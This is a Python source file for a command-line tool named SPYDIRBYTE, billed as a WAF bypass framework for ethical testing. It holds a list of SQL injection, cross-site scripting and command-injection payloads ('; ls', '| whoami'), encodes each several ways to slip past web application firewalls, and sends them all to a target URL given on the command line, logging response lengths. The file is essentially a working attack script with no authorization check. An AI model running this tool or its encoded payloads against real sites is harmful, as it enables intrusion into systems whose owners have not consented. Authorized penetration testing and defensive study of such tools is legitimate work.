import requests
import urllib.parse
import base64
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
import argparse
import time
import json
import os


def spydirbyte_banner():
    print(colored("""
███████╗██████╗ ██╗   ██╗██████╗ ██╗██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗██║██╔══██╗██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝
███████╗██████╔╝ ╚████╔╝ ██║  ██║██║██████╔╝██████╔╝ ╚████╔╝    ██║   █████╗  
╚════██║██╔═══╝   ╚██╔╝  ██║  ██║██║██╔══██╗██╔══██╗  ╚██╔╝     ██║   ██╔══╝  
███████║██║        ██║   ██████╔╝██║██║  ██║██████╔╝   ██║      ██║   ███████╗
╚══════╝╚═╝        ╚═╝   ╚═════╝ ╚═╝╚═╝  ╚═╝╚═════╝    ╚═╝      ╚═╝   ╚══════╝ 
    Advanced WAF Bypass Framework for Ethical Testing
    """, "green"))


# Predefined payloads for SQLi, XSS, and RCE
PREDEFINED_PAYLOADS = {
    "sqli": ["' OR 1=1 --", "' UNION SELECT NULL,NULL --", "' AND SLEEP(5) --"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
    "rce": ["; ls", "| whoami"]
}


def encode_payload(payload, technique):
    if technique == "url":
        return urllib.parse.quote(payload)
    elif technique == "double-url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif technique == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif technique == "hex":
        return ''.join(f"%{hex(ord(c))[2:]}" for c in payload)
    elif technique == "unicode":
        return ''.join(f"\\u{ord(c):04x}" for c in payload)
    elif technique == "noise":
        return f"{payload}/*random_noise*/"  # Inject noise for bypassing rules
    else:
        return payload


def send_request(url, method, payload, headers, proxies, data_type):
    try:
        if method == "GET":
            response = requests.get(url, params={"q": payload}, headers=headers, proxies=proxies, timeout=10)
        elif method == "POST":
            if data_type == "json":
                response = requests.post(url, json={"q": payload}, headers=headers, proxies=proxies, timeout=10)
            else:
                response = requests.post(url, data={"q": payload}, headers=headers, proxies=proxies, timeout=10)
        else:
            print(colored(f"[ERROR] Unsupported HTTP method: {method}", "red"))
            return None

        print(colored(f"[INFO] Response Code: {response.status_code}, Length: {len(response.text)}", "blue"))
        return response.text
    except requests.exceptions.RequestException as e:
        print(colored(f"[ERROR] Failed to connect: {e}", "red"))
        return None


def automated_testing(url, method, headers, proxies, data_type):
    print(colored("[INFO] Starting automated testing...", "yellow"))
    results = []
    for category, payloads in PREDEFINED_PAYLOADS.items():
        for payload in payloads:
            for encoding in ["none", "url", "double-url", "base64", "hex", "noise"]:
                encoded_payload = encode_payload(payload, encoding)
                response = send_request(url, method, encoded_payload, headers, proxies, data_type)
                results.append({"payload": encoded_payload, "response_length": len(response) if response else "N/A"})
                time.sleep(0.5)  # Prevent overwhelming the server
    return results


def save_report(results, output_format):
    filename = f"waf_bypass_report.{output_format}"
    if output_format == "json":
        with open(filename, "w") as f:
            json.dump(results, f, indent=4)
    elif output_format == "txt":
        with open(filename, "w") as f:
            for result in results:
                f.write(f"Payload: {result['payload']}, Response Length: {result['response_length']}\n")
    print(colored(f"[INFO] Report saved to {filename}", "green"))


def main():
    spydirbyte_banner()

    parser = argparse.ArgumentParser(description="SPYDIRBYTE Advanced WAF Bypass Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", choices=["GET", "POST"], default="GET", help="HTTP method to use")
    parser.add_argument("--auto", action="store_true", help="Run automated testing with predefined payloads")
    parser.add_argument("--output", choices=["json", "txt"], default="json", help="Output format for reports")
    args = parser.parse_args()

    headers = {"User-Agent": "SPYDIRBYTE"}
    proxies = {}

    if args.auto:
        results = automated_testing(args.url, args.method, headers, proxies, "form")
        save_report(results, args.output)
    else:
        print(colored("[INFO] Please provide custom testing logic if --auto is not used.", "yellow"))


if __name__ == "__main__":
    main()
